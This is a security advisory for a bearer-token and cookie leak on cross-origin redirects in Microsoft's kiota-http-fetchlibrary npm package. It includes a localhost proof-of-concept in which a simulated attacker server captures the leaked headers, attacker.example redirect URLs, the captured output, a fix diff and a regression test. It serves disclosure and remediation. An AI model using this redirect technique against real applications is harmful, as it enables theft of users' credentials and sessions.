# [M] @microsoft/kiota-http-fetchlibrary: Bearer token and Cookie leak across origin on redirect due to case-mismatched scrub in fetchRequestAdapter

## Summary
Severity: Medium
Advisory: GHSA-396q-4vc8-28x9
CVE: CVE-2026-49336
CWE: CWE-178, CWE-200
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-396q-4vc8-28x9
Type: github-advisory

## Affected
- npm: `@microsoft/kiota-http-fetchlibrary` — affected >=1.0.0-preview.97 <1.0.0-preview.102

## Details
### Summary

`@microsoft/kiota-http-fetchlibrary`'s `RedirectHandler` is documented as stripping `Authorization` and `Cookie` from cross-origin redirect targets, but the default `scrubSensitiveHeaders` callback in `RedirectHandlerOptions` uses case-sensitive property deletion (`delete headers.Authorization`, `delete headers.Cookie`) on a headers object that `FetchRequestAdapter.getRequestFromRequestInformation` has already lower-cased. The delete therefore targets keys that do not exist, the scrub is a no-op, and any Bearer token or Cookie attached by a kiota-generated SDK is forwarded to an attacker-controlled host across a 30x redirect.

This is reachable in the default middleware chain (`MiddlewareFactory.getDefaultMiddlewares`) with no custom configuration, and applies to every kiota-generated TypeScript SDK that uses `BaseBearerTokenAuthenticationProvider` or any other authentication provider that sets the `Authorization` request header.

### Affected versions

`@microsoft/kiota-http-fetchlibrary` `>= 1.0.0-preview.97` (the release that introduced the `defaultScrubSensitiveHeaders` callback, commit `74886cc4`, tagged 2026-02-27) up to and including `1.0.0-preview.101` (latest at filing). The bug was verified end-to-end against the version published on npm: `1.0.0-preview.100`.

The case-mismatch primitive (lowercasing in the request adapter) predates the scrub itself — `FetchRequestAdapter.getRequestFromRequestInformation` has lower-cased header keys via `toLocaleLowerCase()` since commit `d612bac2` (2022-12-09). When the scrub was added in 2026-02 it inherited the mismatch.

### Impact

- **Bearer token leak across origin.** When a kiota-generated SDK calls a server that the SDK trusts (Microsoft Graph, an internal API, any OAuth2 resource server) and that server returns an HTTP redirect to a different host, the `Authorization: Bearer <token>` header issued by the auth provider is sent in cleartext to the redirect target. The redirect target can be controlled by:
  - An attacker who can corrupt or MITM a single 30x response from the legitimate host (downgrade-on-redirect amplifier).
  - An attacker who has temporarily compromised a low-trust endpoint of the upstream API and can issue 302 responses (e.g. a public profile-image URL on Graph that returns 302 to attacker-controlled storage).
  - An attacker who can persuade the kiota-using application to call an attacker-chosen base URL that returns 302 to the attacker (a confused-deputy SSRF-style abuse where the application proxies a user-supplied URL through a kiota-built client).
- **Session cookie leak across origin.** If the application or generated SDK attaches a `Cookie` header, the same primitive forwards it to the redirect target.
- **No user interaction required.** The default middleware chain is in effect; the application does not need to opt in to the bug.

### Vulnerable code

The two pieces that combine into the bug.

**1. Headers are lower-cased on the way out of the request adapter.**

[`packages/http/fetch/src/fetchRequestAdapter.ts:529-532`](https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/fetchRequestAdapter.ts#L529-L532):

```ts
const headers: Record<string, string> | undefined = {};
requestInfo.headers?.forEach((_, key) => {
    headers[key.toString().toLocaleLowerCase()] = this.foldHeaderValue(requestInfo.headers.tryGetValue(key));
});
```

The headers object that flows into the middleware pipeline as `fetchRequestInit.headers` has every key lower-cased. So `Authorization` becomes `authorization`, `Cookie` becomes `cookie`.

**2. The default redirect scrub deletes case-sensitive property names.**

[`packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts:67-82`](https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts#L67-L82):

```ts
private static readonly defaultScrubSensitiveHeaders: ScrubSensitiveHeaders = (headers: Record<string, string>, originalUrl: string, newUrl: string) => {
    if (!headers || !originalUrl || !newUrl) {
        return;
    }
    try {
        const originalUri = new URL(originalUrl);
        const newUri = new URL(newUrl);
        const isDifferentHostOrScheme = originalUri.host.toLowerCase() !== newUri.host.toLowerCase() || originalUri.protocol.toLowerCase() !== newUri.protocol.toLowerCase();
        if (isDifferentHostOrScheme) {
            delete headers.Authorization;
            delete headers.Cookie;
        }
    } catch {
        return;
    }
};
```

`delete headers.Authorization` is sugar for `delete headers["Authorization"]`. JavaScript object property names are case-sensitive. The headers object's actual key is `"authorization"` (lower-case). The delete removes nothing.

**3. The redirect handler invokes the scrub on the lower-cased object.**

[`packages/http/fetch/src/middlewares/redirectHandler.ts:133-136`](https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/http/fetch/src/middlewares/redirectHandler.ts#L133-L136):

```ts
if (fetchRequestInit.headers) {
    currentOptions.scrubSensitiveHeaders(fetchRequestInit.headers as Record<string, string>, url, newUrl);
}
```

The redirect handler then issues a new `fetch` with the unchanged `fetchRequestInit.headers` (still containing `authorization`) to `newUrl` (the attacker-controlled host).

### How the Bearer token reaches the attacker host

1. Application calls a kiota-generated SDK method.
2. `FetchRequestAdapter.send` calls `authenticationProvider.authenticateRequest(requestInfo)`. `BaseBearerTokenAuthenticationProvider` adds `Authorization: Bearer <token>` to `requestInfo.headers` ([`packages/abstractions/src/authentication/baseBearerTokenAuthenticationProvider.ts:34`](https://github.com/microsoft/kiota-typescript/blob/f765544d6ab861222c1fa6fa0a2d3b715786d725/packages/abstractions/src/authentication/baseBearerTokenAuthenticationProvider.ts#L34)).
3. `FetchRequestAdapter.getRequestFromRequestInformation` builds the `RequestInit` object, lower-casing every header key. The output `headers` map contains key `"authorization"`.
4. The default middleware chain runs `RetryHandler` then `RedirectHandler`. `RedirectHandler.execute` sets `redirect = "manual"` so the underlying `fetch` does not auto-follow.
5. The upstream HTTP request goes out to the victim host carrying `authorization: Bearer <token>`.
6. The victim host responds with `302 Location: https://attacker.example/loot`.
7. `RedirectHandler.executeWithRedirect` sees the 302, parses the Location, computes `newUrl`, and calls `currentOptions.scrubSensitiveHeaders(headers, url, newUrl)`.
8. `defaultScrubSensitiveHeaders` correctly observes `originalUri.host !== newUri.host`, enters the `if (isDifferentHostOrScheme)` branch, and runs `delete headers.Authorization`. The headers object's key is `authorization`. The delete is a no-op.
9. `executeWithRedirect` recurses with `url = newUrl` and the unchanged `headers`. A second `fetch` goes out to the attacker host carrying `authorization: Bearer <token>` and `cookie: <session>`.

### Proof of concept

End-to-end PoC against `@microsoft/kiota-http-fetchlibrary@1.0.0-preview.100` and `@microsoft/kiota-abstractions@1.0.0-preview.99` installed from npm with `npm install`. Two local HTTP listeners simulate the victim host (port 7771) and the attacker host (port 7772). The attacker listener captures the full set of request headers it observes.

`package.json`:

```json
{
  "name": "kiota-bearer-leak-poc",
  "version": "0.0.1",
  "private": true,
  "type": "module",
  "dependencies": {
    "@microsoft/kiota-abstractions": "^1.0.0-preview.99",
    "@microsoft/kiota-http-fetchlibrary": "^1.0.0-preview.99"
  }
}
```

`poc.mjs`:

```js
import http from "node:http";
import {
  BaseBearerTokenAuthenticationProvider,
  RequestInformation,
  HttpMethod,
} from "@microsoft/kiota-abstractions";
import {
  FetchRequestAdapter,
  KiotaClientFactory,
} from "@microsoft/kiota-http-fetchlibrary";

const TOKEN = "SECRET_TOKEN_AAAA-BBBB-CCCC-DDDD";
const COOKIE = "session=SECRET_COOKIE_EEEE-FFFF";

const attackerCapture = [];
const attackerServer = http.createServer((req, res) => {
  attackerCapture.push({ url: req.url, headers: req.headers });
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ pwned: true }));
});
await new Promise((r) => attackerServer.listen(7772, "127.0.0.1", r));

const victimServer = http.createServer((req, res) => {
  res.writeHead(302, { Location: "http://127.0.0.1:7772/api/data" });
  res.end();
});
await new Promise((r) => victimServer.listen(7771, "127.0.0.1", r));

class StaticTokenProvider {
  getAuthorizationToken() { return Promise.resolve(TOKEN); }
  getAllowedHostsValidator() { return { getAllowedHosts: () => [] }; }
}
const authProvider = new BaseBearerTokenAuthenticationProvider(new StaticTokenProvider());
const adapter = new FetchRequestAdapter(authProvider, undefined, undefined, KiotaClientFactory.create());
adapter.baseUrl = "http://127.0.0.1:7771";

const requestInfo = new RequestInformation();
requestInfo.urlTemplate = "{+baseurl}/me";
requestInfo.pathParameters["baseurl"] = "http://127.0.0.1:7771";
requestInfo.httpMethod = HttpMethod.GET;
requestInfo.headers.add("Cookie", COOKIE);

try { await adapter.sendNoResponseContent(requestInfo, undefined); } catch (e) {}

console.log("attacker received:", JSON.stringify(attackerCapture[0]?.headers, null, 2));
attackerServer.close();
victimServer.close();
```

### End-to-end reproduction against `@microsoft/kiota-http-fetchlibrary@1.0.0-preview.100`

Setup:

```bash
mkdir kiota-leak && cd kiota-leak
cat > package.json <<'EOF'
{
  "name": "kiota-bearer-leak-poc",
  "version": "0.0.1",
  "private": true,
  "type": "module",
  "dependencies": {
    "@microsoft/kiota-abstractions": "^1.0.0-preview.99",
    "@microsoft/kiota-http-fetchlibrary": "^1.0.0-preview.99"
  }
}
EOF
# Save the poc.mjs above into the same directory
npm install
node --version  # tested on Node v26.0.0
node poc.mjs
```

Captured transcript (verbatim from a clean run on Node v26):

```
attacker received: {
  "host": "127.0.0.1:7772",
  "connection": "keep-alive",
  "cookie": "session=SECRET_COOKIE_EEEE-FFFF",
  "authorization": "Bearer SECRET_TOKEN_AAAA-BBBB-CCCC-DDDD",
  "user-agent": "kiota-typescript/1.0.0-preview.24",
  "accept": "*/*",
  "accept-language": "*",
  "sec-fetch-mode": "cors",
  "accept-encoding": "gzip, deflate"
}
```

The attacker-controlled host on `127.0.0.1:7772` (a different origin from `127.0.0.1:7771`) observes both the OAuth2 Bearer token and the session cookie. The default `RedirectHandler.scrubSensitiveHeaders` did execute its delete branch (verified by inserting a `console.log` inside the scrub) but the deletes targeted property names that did not exist, leaving the lower-cased headers intact.

### Suggested fix

Two-line change to `defaultScrubSensitiveHeaders` to drop sensitive headers regardless of key case, with `Proxy-Authorization` covered for the Node-with-agent case.

```diff
--- a/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts
+++ b/packages/http/fetch/src/middlewares/options/redirectHandlerOptions.ts
@@ -73,12 +73,21 @@ export class RedirectHandlerOptions implements RequestOption {
         try {
             const originalUri = new URL(originalUrl);
             const newUri = new URL(newUrl);

-            // Remove Authorization and Cookie headers if the request's scheme or host changes
+            // Remove Authorization, Cookie, and Proxy-Authorization headers if the request's scheme or host changes.
+            // Header keys must be matched case-insensitively because the request adapter lower-cases
+            // header keys before they reach this middleware (see FetchRequestAdapter.getRequestFromRequestInformation).
             const isDifferentHostOrScheme = originalUri.host.toLowerCase() !== newUri.host.toLowerCase() || originalUri.protocol.toLowerCase() !== newUri.protocol.toLowerCase();

             if (isDifferentHostOrScheme) {
-                delete headers.Authorization;
-                delete headers.Cookie;
+                for (const key of Object.keys(headers)) {
+                    const lower = key.toLowerCase();
+                    if (lower === "authorization" || lower === "cookie" || lower === "proxy-authorization") {
+                        delete headers[key];
+                    }
+                }
             }
         } catch {
             // If URL parsing fails, don't modify headers
```

Tests should be extended in `packages/http/fetch/test/node/RedirectHandler.ts` to cover the realistic case where headers arrive lower-cased — the existing tests use PascalCase `Authorization: ...` fixtures that match the buggy delete by coincidence and therefore pass even with the no-op scrub. Add at minimum:

```ts
it("Should drop authorization and cookie regardless of key case", async () => {
    const fetchRequestInit = {
        method: "GET",
        headers: { authorization: "Bearer TEST", cookie: "session=SECRET" },
    };
    const options = new RedirectHandlerOptions();
    options.scrubSensitiveHeaders(
        fetchRequestInit.headers,
        "https://graph.microsoft.com/v1.0/me",
        "https://attacker.example/loot",
    );
    assert.isUndefined(fetchRequestInit.headers.authorization);
    assert.isUndefined(fetchRequestInit.headers.cookie);
});
```

### Fix commit

https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974

### Credit

Reported by tonghuaroot.

## References
- https://github.com/microsoft/kiota-typescript/security/advisories/GHSA-396q-4vc8-28x9
- https://nvd.nist.gov/vuln/detail/CVE-2026-49336
- https://github.com/microsoft/kiota-typescript/commit/09f8bd9b34d68bf412a9b78f6ca7e7961ef14974
- https://github.com/microsoft/kiota-typescript
